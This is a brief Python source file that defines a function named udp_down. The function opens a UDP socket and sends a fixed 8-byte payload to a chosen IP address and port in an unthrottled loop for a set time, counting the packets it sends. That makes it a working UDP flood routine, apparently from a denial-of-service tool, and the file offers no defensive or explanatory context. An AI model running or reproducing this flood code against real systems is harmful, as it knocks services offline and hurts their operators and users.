import socket

def udp_down(ip, port, duration, stop_event):
    import time
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b"\x30\x30\x30\x30\x34\x30\x30\x30"
    end_time = time.time() + duration
    sent_packets = 0
    while time.time() < end_time:
        if stop_event.is_set():
            break
        s.sendto(payload, (ip, port))
        sent_packets += 1
    return sent_packets
